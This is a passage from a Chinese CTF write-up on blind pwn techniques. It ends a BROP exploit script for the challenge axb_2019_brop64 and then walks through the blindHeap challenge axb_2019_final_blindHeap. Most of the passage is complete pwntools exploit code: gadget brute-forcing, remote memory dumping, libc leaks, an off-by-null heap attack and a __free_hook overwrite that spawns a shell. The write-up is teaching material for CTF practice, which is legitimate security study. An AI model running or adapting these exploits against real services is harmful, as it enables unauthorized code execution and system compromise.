                sh.send('A' * padding_length + p16(maybe_low_byte))
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success("We found a stop gadget is " + hex(old_return_addr+maybe_low_byte))
                    return (old_return_addr+padding_length)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    
    def Find_brop_gadget(libc_csu_init_address_maybe,padding_length,stop_gadget):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(libc_csu_init_address_maybe+maybe_low_byte) 
                payload += p64(0) * 6 
                payload += p64(stop_gadget) + p64(0) * 10
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success(
                        "We found a brop gadget is " + hex(
                            libc_csu_init_address_maybe+maybe_low_byte
                        )
                    )
                    return (libc_csu_init_address_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    
    def Find_func_plt(func_plt_maybe,padding_length,stop_gadget,brop_gadget):
        maybe_low_byte=0x0600
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(0x400000)
                payload += p64(func_plt_maybe+maybe_low_byte)
                payload += p64(stop_gadget)
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "ELF" in sh.recvall(timeout=1):
                    log.success(
                        "We found a function plt address is " + hex(func_plt_maybe+maybe_low_byte)
                    )
                    return (func_plt_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    
    def Dump_file(func_plt,padding_length,stop_gadget,brop_gadget):
        process_old_had_received_length=0
        process_now_had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                while True:
                    sh.recvuntil("Please tell me:")
                    payload  = 'A' * (padding_length - len('Begin_leak----->'))
                    payload += 'Begin_leak----->'
                    payload += p64(brop_gadget+9) # pop rdi;ret;
                    payload += p64(0x400000+process_now_had_received_length)
                    payload += p64(func_plt)
                    payload += p64(stop_gadget)
                    sh.send(payload)
                    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
                    received_data = sh.recvuntil('x0AHello')[:-6]
                    if len(received_data) == 0 :
                        file_content += 'x00'
                        process_now_had_received_length += 1
                    else :
                        file_content += received_data
                        process_now_had_received_length += len(received_data)
            except:
                if process_now_had_received_length == process_old_had_received_length :
                    log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                    with open('axb_2019_brop64_dump','wb') as fout:
                        fout.write(file_content)
                    return
                process_old_had_received_length = process_now_had_received_length
                sh.close()
                pass
    
    
    padding_length=216
    if padding_length is null:
        padding_length=Force_find_padding()
    
    old_return_addr=0x400834
    if old_return_addr is null:
        sh.recvuntil("Please tell me:")
        sh.send('A' * padding_length)
        sh.recvuntil('A' * padding_length)
        old_return_addr=u64(sh.recvuntil('Goodbye!').strip('Goodbye!').ljust(8,'x00'))
        log.info('The old return address is '+ hex(old_return_addr))
    
    stop_gadget=0x4007D6
    if stop_gadget is null:
        stop_gadget=Find_stop_gadget(old_return_addr & 0xFFF000,padding_length)
    
    brop_gadget=0x40095A
    if brop_gadget is null:
        brop_gadget=Find_brop_gadget(old_return_addr & 0xFFF000,padding_length,stop_gadget)
    
    func_plt=0x400635
    if func_plt is null:
        func_plt=Find_func_plt(old_return_addr & 0xFFF000,padding_length,stop_gadget,brop_gadget)
    
    is_dumped=True
    if is_dumped is not True:
        Dump_file(func_plt,padding_length,stop_gadget,brop_gadget)
        is_dumped=True
    
    sh = get_sh()
    puts_got_addr=0x601018
    puts_plt_addr=0x400640
    
    payload  = 'A' * (padding_length - len('Begin_leak----->'))
    payload += 'Begin_leak----->'
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(puts_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
    puts_addr = u64(sh.recvuntil('x0AHello')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    payload  = 'A' * padding_length
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recv()
    sh.interactive()
    sh.close()
    

## 0x05 Blind_Heap

###  以axb_2019_final_blindHeap为例

**漏洞探测**

首先，我们通过输入`a b`，通过程序的回显，我们可以看出， **程序的读入被空格截断了**
，根据这个特征，我们可以推测出，程序使用了`scanf()`作为输入函数。

![](https://p2.ssl.qhimg.com/dm/1024_586_/t0190716133233b26b6.png)

我们判断出程序使用`scanf()`作为输入函数后，
**因为`scanf()`总会在我们输入的字符串的最后加`x00`**，我们便可以推测程序中是否存在`Off-by-one`漏洞存在。

**泄露堆地址——第一个Chunk的地址**

根据一般的堆题目的规律，程序的内存布局可能形如：

    
    
    <name      + 00> : 0000000000000000 0000000000000000
    <name      + 10> : 0000000000000000 0000000000000000
    <cart_list + 00> : 0000000000000000 0000000000000000
    

那么当我们填满name区域后，申请一个Chunk，我们就可以泄露其地址。

    
    
    sh=get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 24 + 'Leak--->')
    Add_shopping_cart(sh,0x40,'Chunk_0',0x40,'Chunk_0')
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_addr=u64(sh.recvuntil('U's').strip('U's').ljust(8,'x00'))
    log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
    #[+] We leak the first chunk address is 0x5626f3eeb0b0
    

**Dump内存（任意地址读）**

那么我们可以利用这个`off-by-null`构造一个任意地址读。

此处根据我们的输入我们事实上可以推测程序内的数据结构，结构应该如下：

    
    
    struct Cart{
        int name_size;
        char*    name;
        int desc_size;
        char*    desc;
    } cart;
    

那么程序中必然有：

  1. cart_list存放着若干个cart结构的地址。
  2. 每个cart结构均由malloc(0x20)产生。
  3. 每个name均由malloc(name_size)产生。
  4. 每个description均由malloc(desc_size)产生。

那么当我们的desc_size大于0x100字节就能保证name和cart结构一定位于0x100个字节以外，这样当cart结构的最低byte被置0时，一定位于description的可控区域。

例，description的起始地址是`0x6004????`，那么，description的可控区域就是`0x6004(?+1)???`，并且cart结构一定位于`0x6004?(?+1)(??+0x20)`，当最低byte被置0时，伪cart结构一定位于`0x6004?(?+1)00`，一定在可控区域，但是我们需要至少可控0x10字节才能控制cart结构中的name结构，那么也就要求我们的description的起始地址的最低byte一定需要大于0x10。因此泄露可能失败，失败率1/16。

我们写出泄露脚本：

    
    
    def Dump_file():
        had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                sh.recvuntil('Enter your name(1~32):')
                sh.send('A' * 0x18 + 'Leak--->')
                Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
                sh.recvuntil('Your choice:')
                sh.sendline('3')
                sh.recvuntil('Your choice:')
                sh.sendline('1')
                sh.recvuntil('Leak--->')
                first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
                log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
                padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
                payload = 'A' * padding + p64(0) + p64(0x30) 
                payload += p64(0xC) + p64(0x400000+had_received_length) 
                payload += p64(0xC) + p64(0x400000+had_received_length)
                Display_product(sh,1)
                Modify_product(sh,0,'Chunk_0',payload)
                Change_name(sh,'A' * 0x18 + 'Leak--->')
                Display_product(sh,1)
                sh.recvuntil('commodity's name is ')
                received_data = sh.recvuntil('x0Acommo',timeout=1)[:-6]
                if len(received_data) == 0 :
                    file_content += 'x00'
                    had_received_length += 1
                else :
                    file_content += received_data
                    had_received_length += len(received_data)
                log.info('We have get ' + str(had_received_length) +'byte file!')
                sh.close()
            except:
                log.info('We get ' + str(had_received_length) +' byte file!')
                with open('axb_2019_final_blindHeap_dump','wb') as fout:
                    fout.write(file_content)
                break
                sh.close()
                pass
    
    Dump_file()
    

**IDA文件修复 &分析**

虽然仍然有大量的函数分析不出来，甚至我们连main函数的位置都是未知的，但是，我们可以根据函数的固定`opcode`找到一个可分析的函数。

![](https://p0.ssl.qhimg.com/dm/1024_640_/t017127ae71de7bed6e.png)

此时我们愿意相信远端没有开启RELRO保护，如果确实如此，我们只需要篡改got表地址即可，那么我们可以很容易分析出`sub_4007C0`疑似`puts`函数，那么我们先假设它为puts函数，然后泄露它的`.got`表地址。

![](https://p5.ssl.qhimg.com/t0157239463562d4db9.png)

我们还可以很容易的分析出，`sub_4007A0`应为free的got表地址。

![](https://p5.ssl.qhimg.com/dm/1024_640_/t01aadd786f2ce08832.png)

那么我们接下来将free的got表地址篡改为system，调用即可。

**Local EXP（本地成功）**

    
    
    from pwn import *
    all_commodity=1
    just_one=2
    context.log_level='debug'
    context.arch='amd64'
    
    # file_name=ELF("./")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    def Add_shopping_cart(sh,product_descript_size,product_descript,product_name_size,product_name):
        sh.recvuntil('Your choice:')
        sh.sendline('1')
        sh.recvuntil('please tell me the desrcription's size.n')
        sh.sendline(str(product_descript_size))
        sh.recvuntil('please tell me the desrcript of commodity.n')
        sh.sendline(product_descript)
        sh.recvuntil('please tell me the commodity-name's size.n')
        sh.sendline(str(product_name_size))
        sh.recvuntil('please tell me the commodity-name.n')
        sh.sendline(product_name)
    
    def Modify_product(sh,index,product_name,product_descript):
        sh.recvuntil('Your choice:')
        sh.sendline('2')
        sh.recvuntil('The index is ')
        sh.sendline(str(index))
        sh.recvuntil('please tell me the new commodity's name.n')
        sh.sendline(product_name)
        sh.recvuntil('please tell me the new commodity's desrcription.n')
        sh.sendline(product_descript)
    
    def Display_product(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('3')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    
    def Buy_shopping_cart(sh):
        sh.recvuntil('Your choice:')
        sh.sendline('4')
    
    def Delete_shopping_cart(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('5')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    
    def Change_name(sh,new_name):
        sh.recvuntil('Your choice:')
        sh.sendline('6')
        sh.recvuntil('Change your name(1~32):')
        sh.sendline(new_name)
    
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_final_blindHeap")
    
    def Dump_file():
        had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                sh.recvuntil('Enter your name(1~32):')
                sh.send('A' * 0x18 + 'Leak--->')
                Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
                sh.recvuntil('Your choice:')
                sh.sendline('3')
                sh.recvuntil('Your choice:')
                sh.sendline('1')
                sh.recvuntil('Leak--->')
                first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
                log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
                padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
                payload = 'A' * padding + p64(0) + p64(0x30) 
                payload += p64(0xC) + p64(0x400000+had_received_length) 
                payload += p64(0xC) + p64(0x400000+had_received_length)
                Display_product(sh,1)
                Modify_product(sh,0,'Chunk_0',payload)
                Change_name(sh,'A' * 0x18 + 'Leak--->')
                Display_product(sh,1)
                sh.recvuntil('commodity's name is ')
                received_data = sh.recvuntil('x0Acommo',timeout=1)[:-6]
                if len(received_data) == 0 :
                    file_content += 'x00'
                    had_received_length += 1
                else :
                    file_content += received_data
                    had_received_length += len(received_data)
                log.info('We have get ' + str(had_received_length) +'byte file!')
                sh.close()
            except:
                log.info('We get ' + str(had_received_length) +' byte file!')
                with open('axb_2019_final_blindHeap_dump','wb') as fout:
                    fout.write(file_content)
                break
                sh.close()
                pass
    
    # Dump_file()
    sh = get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 0x18 + 'Leak--->')
    Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
    log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
    padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
    payload = 'A' * padding + p64(0) + p64(0x30) 
    payload += p64(0xC) + p64(0x603028) 
    payload += p64(0xC) + p64(0x603018)
    Display_product(sh,1)
    Modify_product(sh,0,'Chunk_0',payload)
    Change_name(sh,'A' * 0x18 + 'Leak--->')
    Display_product(sh,1)
    sh.recvuntil('commodity's name is ')
    puts_addr = u64(sh.recvuntil('x0Acommo')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    log.success('We get libc base address is ' + str(hex(libc_base)))
    log.success('We get system address is ' + str(hex(system_addr)))
    Add_shopping_cart(sh,0x8,'/bin/shx00',0x8,'/bin/shx00')
    Modify_product(sh,0,p64(puts_addr),p64(system_addr))
    gdb.attach(sh)
    Delete_shopping_cart(sh,just_one,1)
    sh.interactive()
    sh.close()
    

⚠：经测试，远端开启了PIE+ASLR，导致本思路不再可用，我们使用另外的思路进行攻击。

⚠：经测试，远端文件和本地测试文件不同，当我们调用display函数时不再泄露函数地址。

**泄露main_arena，Leak libc base**

我们还是利用刚才的思路进行任意地址读，但是在此之前，我们需要先在我们所有申请的chunk后方布置一个大小大于`fast_max`(一般是0x80)的chunk。那么当我们释放它后，会将main_arena的内容写进fd域和bk域，由于无法得知程序加载位置，我们也不能泄露文件，也就无从得知文件逻辑（不知道到底main_arena的内容会在name中还是description中），我们可以基于第一个Chunk的地址推知其余Chunk的地址，那么我们直接针对其name和description进行读

![](https://p2.ssl.qhimg.com/dm/1024_640_/t01d6983392478b9475.png)

顺利泄露，我们可以以此为据计算libc基址，经查阅libc，此libc的main_arena地址为0x3C4B78。

**篡改free_hook**

接下来我们采用改写free_hook的利用方式。

但是我们已经改变了堆结构，无法进行empty (chunk_0)，已经没有可控地址了。

此处我们可以在一开始再次提前布置一个Ctrl_Chunk，我们的Chunk
0，可以对两个任意地址进行读写操作，那么我们可以将main_arena的地址放在第一个地址进行泄露，然后将`Ctrl_Chunk->cart`的`data`域放在第二个地址进行任意写，那么相当于我们又拥有了两个任意地址进行读写操作。那么构造payload改写free_hook即可。

**Final EXP**

    
    
    from pwn import *
    all_commodity=1
    just_one=2
    context.log_level='debug'
    context.arch='amd64'
    
    # file_name=ELF("./")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    def Add_shopping_cart(sh,product_descript_size,product_descript,product_name_size,product_name):
        sh.recvuntil('Your choice:')
        sh.sendline('1')
        sh.recvuntil('please tell me the desrcription's size.n')
        sh.sendline(str(product_descript_size))
        sh.recvuntil('please tell me the desrcript of commodity.n')
        sh.sendline(product_descript)
        sh.recvuntil('please tell me the commodity-name's size.n')
        sh.sendline(str(product_name_size))
        sh.recvuntil('please tell me the commodity-name.n')
        sh.sendline(product_name)
    
    def Modify_product(sh,index,product_name,product_descript):
        sh.recvuntil('Your choice:')
        sh.sendline('2')
        sh.recvuntil('The index is ')
        sh.sendline(str(index))
        sh.recvuntil('please tell me the new commodity's name.n')
        sh.sendline(product_name)
        sh.recvuntil('please tell me the new commodity's desrcription.n')
        sh.sendline(product_descript)
    
    def Display_product(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('3')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    
    def Buy_shopping_cart(sh):
        sh.recvuntil('Your choice:')
        sh.sendline('4')
    
    def Delete_shopping_cart(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('5')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    
    def Change_name(sh,new_name):
        sh.recvuntil('Your choice:')
        sh.sendline('6')
        sh.recvuntil('Change your name(1~32):')
        sh.sendline(new_name)
    
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_final_blindHeap")
    
    sh = get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 0x18 + 'Leak--->')
    Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
    Add_shopping_cart(sh,0x100,'Chunk_1',0x100,'Chunk_1')
    Add_shopping_cart(sh,0x100,'Chunk_2',0x100,'Chunk_2')
    Add_shopping_cart(sh,0x100,'Chunk_3',0x100,'Chunk_3')
    Add_shopping_cart(sh,0x100,'/bin/shx00',0x100,'/bin/shx00')
    
    Delete_shopping_cart(sh,just_one,1)
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_cart_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00'))
    first_chunk_name_addr=first_chunk_cart_addr - 0x10  - 0x10
    first_chunk_desc_addr=first_chunk_name_addr - 0x10  - 0x150
    leak__chunk_desc_addr=first_chunk_cart_addr + 0x20  + 0x10
    leak__chunk_name_addr=leak__chunk_desc_addr + 0x100 + 0x10
    leak__chunk_cart_addr=leak__chunk_name_addr + 0x100 + 0x10
    ctrol_chunk_desc_addr=leak__chunk_cart_addr + 0x20  + 0x10
    ctrol_chunk_name_addr=ctrol_chunk_desc_addr + 0x100 + 0x10
    ctrol_chunk_cart_addr=ctrol_chunk_name_addr + 0x100 + 0x10
    log.success('Chunk_0 -> name        : '+str(hex(first_chunk_name_addr)))
    log.success('Chunk_0 -> description : '+str(hex(first_chunk_desc_addr)))
    log.success('Chunk_0 -> cart        : '+str(hex(first_chunk_cart_addr)))
    log.success('Chunk_1 -> name        : '+str(hex(leak__chunk_name_addr)))
    log.success('Chunk_1 -> description : '+str(hex(leak__chunk_desc_addr)))
    log.success('Chunk_1 -> cart        : '+str(hex(leak__chunk_cart_addr)))
    log.success('Chunk_2 -> name        : '+str(hex(ctrol_chunk_name_addr)))
    log.success('Chunk_2 -> description : '+str(hex(ctrol_chunk_desc_addr)))
    log.success('Chunk_2 -> cart        : '+str(hex(ctrol_chunk_cart_addr)))
    padding = ( 0x100 - (first_chunk_desc_addr & 0xFF) ) - 0x10
    payload = 'A' * padding + p64(0) + p64(0x30) 
    payload += p64(0x20) + p64(leak__chunk_name_addr) 
    payload += p64(0x20) + p64(ctrol_chunk_cart_addr)
    Modify_product(sh,0,'Chunk_0',payload)
    Change_name(sh,'A' * 0x18 + 'Leak--->')
    Display_product(sh,all_commodity)
    sh.recvuntil('commodity's name is ')
    main_arena_addr = u64(sh.recvuntil('x0Acommo')[:-6].ljust(8,'x00'))
    log.success('We get main arena address is ' + str(hex(main_arena_addr)))
    libc_base = main_arena_addr - 0x3C4B78
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    log.success('We get libc base address is ' + str(hex(libc_base)))
    log.success('We get system address is ' + str(hex(system_addr)))
    sh.recvline()
    payload  = p64(0x20) + p64(free_hook) 
    payload += p64(0x20) + p64(free_hook)
    Display_product(sh,all_commodity)
    Modify_product(sh,0,p64(main_arena_addr),payload)
    Display_product(sh,all_commodity)
    Modify_product(sh,2,p64(system_addr),p64(system_addr))
    Delete_shopping_cart(sh,just_one,3)
    sh.interactive()
    

## 0x06 其他的盲打系列(探测栈溢出)

题目为`GXYCTF`的题目，暂无任何复现环境，因此等待更新。

## 0x07 参考链接

[blind-pwn系列总结+创新](https://xz.aliyun.com/t/6984)

[安洵杯2019 官方Writeup(Re/Pwn/Crypto) – D0g3](https://xz.aliyun.com/t/6912)

[x64 之 __libc_csu_init
通用gadget](https://goldsnow.github.io/2017/03/30/x64%E4%B9%8B__libc_csu_init%E9%80%9A%E7%94%A8gadget/)

[__libc_csu_init函数的通用gadget](https://www.cnblogs.com/Ox9A82/p/5487725.html)

[Blind Return Oriented Programming (BROP) Attack –
攻击原理](https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20\(BROP)

[【CTF攻略】格式化字符串blind pwn详细教程](https://www.anquanke.com/post/id/85731)

[Linux X86 程序启动 – main函数是如何被执行的？](https://luomuxiaoxiao.com/?p=516)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ERROR404** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/196722](/post/id/196722)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __19赞

 __收藏

![](https://p5.ssl.qhimg.com/t01fc6ae8fa56997fe6.jpg) ERROR404

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

